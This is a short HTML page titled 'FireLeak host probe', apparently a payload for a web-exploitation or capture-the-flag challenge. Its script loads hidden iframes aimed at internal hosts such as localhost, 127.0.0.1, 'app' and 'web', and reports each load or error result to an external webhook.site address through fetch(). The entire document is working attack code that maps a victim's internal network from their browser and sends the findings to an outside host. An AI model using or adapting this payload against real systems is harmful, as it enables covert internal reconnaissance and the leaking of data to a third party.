<!doctype html>
<html>
<body>
<h1>FireLeak host probe</h1>

<script>
const endpoint = "https://webhook.site/5dc1560a-274c-4539-af81-568512041310";

const hosts = [
  "http://127.0.0.1",
  "http://localhost",
  "http://fireleak",
  "http://app",
  "http://web",
];

function log(host, ev) {
  fetch(`${endpoint}?kind=hostscan&host=${encodeURIComponent(host)}&event=${ev}`).catch(() => {});
}

function probeHost(base) {
  const ifr = document.createElement("iframe");
  ifr.onload = () => log(base, "load");
  ifr.onerror = () => log(base, "error");
  ifr.src = base + "/?cb=" + Math.random();
  document.body.appendChild(ifr);
}

hosts.forEach(probeHost);
</script>

</body>
</html>
